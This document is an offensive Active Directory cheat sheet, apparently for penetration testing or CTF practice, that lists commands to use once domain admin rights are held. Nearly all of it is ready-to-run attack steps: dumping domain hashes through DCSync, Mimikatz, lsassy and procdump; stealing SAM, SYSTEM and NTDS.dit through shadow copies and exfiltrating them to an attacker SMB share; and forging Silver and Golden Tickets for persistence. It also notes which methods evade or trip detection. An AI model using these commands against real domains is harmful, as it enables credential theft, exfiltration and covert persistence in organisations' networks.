---
title: AD Post DA
type: note
tab: Active Directory
inputs: [Username, Password, Hash, Shell]
outputs: [Hash, TGT, NTDS, Persistence]
tags: [ActiveDirectory, Windows, CredentialDumping, Persistence, Kerberos, SMB]
---

# AD Post DA

## WHY

After DA, dump domain credentials, collect persistence material, and identify trust/pivot opportunities.

## WHEN

- You have DA credentials/hash.
- You have DCSync rights.
- You have local admin or shell on the DC.

## NEXT

- `krbtgt` hash: Golden Ticket persistence.
- Trusts found: pivot to another domain/forest.

## Commands

### DCSync

#Username #Password #ActiveDirectory #CredentialDumping
Dump domain hashes with DCSync using Impacket, Mimikatz, or NetExec.

```sh
# Impacket: dump all domain hashes.
impacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASS>@<DC_IP>

# Impacket: dump one user.
impacket-secretsdump -just-dc-user <TARGET_USER> <DOMAIN>/<USER>:<PASS>@<DC_IP>

# Mimikatz from a Windows shell.
mimikatz.exe "lsadump::dcsync /domain:<DOMAIN> /user:<TARGET_USER>"

# NetExec with password.
nxc smb <DC_IP> -u <USER> -p '<PASS>' --ntds

# NetExec with NTLM hash.
nxc smb <DC_IP> -u <USER> -H <NTLM_HASH> --ntds
```

### LSASS Dump With Mimikatz

#Shell #Windows #ActiveDirectory #CredentialDumping
Dump logon credentials with Mimikatz on DC.

```powershell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### LSASS Minidump Offline Parse

#Shell #Windows #ActiveDirectory #CredentialDumping
Dump LSASS for offline parsing, then parse the minidump on the attacker box.

1. Dump LSASS on the target.

```powershell
procdump.exe -ma lsass.exe lsass.dmp
```

2. Parse the minidump offline.

```sh
pypykatz lsa minidump lsass.dmp
```

### Remote LSASS Dump With Lsassy

#Username #Password #SMB #Windows #ActiveDirectory #CredentialDumping
Remote LSASS dump with lsassy.

```sh
lsassy -d <DOMAIN> -u <USER> -p '<PASS>' <DC_IP>
```

### SAM + SYSTEM

#Shell #Windows #CredentialDumping
Save SAM/SYSTEM hives and extract local hashes offline.

```cmd
:: Target: save hives.
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

:: Attacker: extract local hashes offline.
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

### NTDS IFM Backup

#Shell #Windows #ActiveDirectory #CredentialDumping
Create an IFM backup on the DC for offline NTDS extraction.

```cmd
:: Target/DC: create IFM backup.
ntdsutil "activate instance ntds" "ifm" "create full C:\temp" quit quit

:: Attacker: extract hashes from the copied IFM files.
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### NTDS Shadow Copy Exfil

#Shell #Windows #ActiveDirectory #CredentialDumping
Create a shadow copy, copy `NTDS.dit` and `SYSTEM`, then exfiltrate them over SMB.

```cmd
:: Target/DC: create a shadow copy.
vssadmin create shadow /for=C: /autoretry=2

:: Target/DC: if vssadmin is blocked, try vshadow.
vshadow.exe -nw -p C:

:: Target/DC: copy NTDS and SYSTEM from the discovered shadow copy path.
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<NUM>\Windows\NTDS\ntds.dit C:\NTDS.DIT
reg.exe save HKLM\SYSTEM C:\SYSTEM

:: Attacker: expose an SMB share.
impacket-smbserver share . -username <USER> -password <PASS> -smb2support

:: Target/DC: mount the attacker share and copy files out.
net use \\<LHOST>\share /user:<USER> <PASS>
copy C:\NTDS.DIT \\<LHOST>\share\
copy C:\SYSTEM \\<LHOST>\share\
```

### NTDS NetExec Dump

#Username #Password #SMB #ActiveDirectory #CredentialDumping
Dump only enabled accounts or use the VSS method with NetExec.

```sh
nxc smb <DC_IP> -u <USER> -p '<PASS>' --ntds --enabled
nxc smb <DC_IP> -u <USER> -p '<PASS>' --ntds vss
```

### NTDS Secretsdump VSS

#ProtectedFile #ActiveDirectory #CredentialDumping
Dump NTDS offline or use remote VSS when DCSync is not available but admin access exists.

```sh
# Offline from copied NTDS.DIT and SYSTEM files.
impacket-secretsdump -ntds NTDS.DIT -system SYSTEM LOCAL

# Remote VSS with domain admin or equivalent rights.
impacket-secretsdump -just-dc '<DOMAIN>/<USER>:<PASS>'@<DC_IP> -use-vss
```

### NTDS NetExec Log Filtering

#ProtectedFile #ActiveDirectory #CredentialDumping
Filter enabled NTDS entries from NetExec output logs.

```sh
grep -iv disabled ~/.nxc/logs/ntds/<DC_NAME>.ntds
grep -iv disabled ~/.nxc/logs/ntds/<DC_NAME>.ntds | cut -d ':' -f1
```

### Silver Tickets

#Shell #Kerberos #ActiveDirectory #Persistence
Forge and inject a Silver Ticket with a service account NTLM hash.

```powershell
powershell -ep bypass
iwr -UseDefaultCredentials http://<TARGET_WEB>
klist
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
.\mimikatz.exe "kerberos::golden /sid:<DOMAIN_SID> /domain:<DOMAIN> /ptt /target:<TARGET_HOST> /service:http /rc4:<SERVICE_NTLM_HASH> /user:<USER>"
iwr -UseDefaultCredentials http://<TARGET_WEB>
```

### Golden Ticket

#Username #Hash #Kerberos #ActiveDirectory #Persistence
Dump the `krbtgt` hash, forge a Golden Ticket, and use it for domain persistence.

```powershell
# Attacker: find the domain SID.
impacket-lookupsid '<DOMAIN>/<USER>:<PASS>'@<DC_IP>

# Attacker: dump only krbtgt with DCSync rights.
impacket-secretsdump -just-dc-user krbtgt '<DOMAIN>/<USER>:<PASS>'@<DC_IP>

# Target Windows shell: inject the forged ticket with Mimikatz.
mimikatz.exe
privilege::debug
kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM_HASH> /ptt
misc::cmd

# New CMD: access a target using the injected ticket.
klist
PsExec.exe \\<DC_HOST> cmd
type C:\Users\Administrator\Desktop\flag.txt
```

## Priority

1. DCSync first if rights allow it.
2. If DCSync fails, dump LSASS/SAM/NTDS from DC.
3. Save `krbtgt` hash for Golden Ticket persistence.
4. Look for trusts and pivot paths.

## Gotchas

- DCSync is cleaner than logging onto the DC.
- NTDS.dit requires SYSTEM hive to decrypt.
- `procdump` may be blocked by AV/EDR.
- `ntdsutil` and VSS methods are noisy.
- `whoami /user`, BloodHound object data, or SID lookup techniques can provide the domain SID needed for Silver Tickets.
